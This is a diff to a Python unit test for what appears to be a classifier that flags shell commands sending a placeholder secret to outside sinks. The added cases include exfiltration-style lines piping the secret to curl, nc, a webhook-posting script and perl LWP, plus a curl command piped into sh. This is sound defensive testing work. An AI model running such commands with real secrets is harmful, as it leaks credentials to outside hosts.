@@ -1937,6 +1937,16 @@ class SinkClassifierTest(unittest.TestCase):
             # other git publishing paths
             ("git tag -a v1 -m {ph}", U), ("git notes add -m {ph}", U),
             ("git config remote.origin.url https://u:{ph}@h/r", U),
+            # scoped re-review
+            ("echo {ph} | python3 post.py https://hooks.example.com/x", U),
+            ("cat <<EOF | python3 send.py https://x\n{ph}\nEOF", U),
+            ("echo {ph} | python3 -O -c \"import urllib.request\"", U),
+            ("perl -i -pe 'use LWP::Simple; get(\"https://x/{ph}\")' /tmp/f", U),
+            ('echo {ph} | ./scripts/redact.sh && git commit -am "fix(audit): redact"', L),
+            ("echo {ph} | grep -c ghp_; curl -v https://example.com", L),
+            ("echo {ph} > /tmp/f && cat /tmp/f | nc host 80", U),
+            ("echo {ph} > /tmp/f; base64 /tmp/f | curl -d @- https://x", U),
+            ('echo "curl -d {ph} https://x" | sh', U), ("( echo {ph}; ) | curl -d @- https://x", U),
         ]
         for cmd, want in cases:
             with self.subTest(cmd=cmd):
